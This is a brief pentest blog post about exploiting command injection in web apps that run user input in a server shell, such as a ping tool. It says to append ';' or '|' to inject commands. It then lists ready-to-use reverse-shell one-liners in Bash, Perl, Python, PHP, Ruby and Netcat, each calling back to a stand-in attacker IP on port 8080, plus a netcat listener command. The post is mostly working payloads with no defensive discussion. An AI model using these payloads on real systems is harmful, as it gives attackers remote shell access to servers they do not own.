+++
categories = ["Pentest", "Web"]
date = "2021-01-20"
title = "Vulnerability Code Injection"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++

Sometimes webs let us use the internal terminal of their server to maybe perform a specific task, like sending a ping. In that case we can try to add a `;` or `|` after the valid argument so we can execute our own commands. In this case we can try to connect to the server shell.

The next examples are so the attacker ip is 8.8.8.8 and we are using the port 8080. So is all this cases we would have to set a terminal listening to the port 8080 by `nc -vv -l -p 8080`

* Bash 
```
bash -i >& /dev/tcp/8.8.8.8/8080 0>&1
```

*  Perl
  
```
perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* Python
  
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

*  PHP
  
```
php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* Ruby

```
ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

* Netcat

```
nc -e /bin/sh 8.8.8.8 8080
```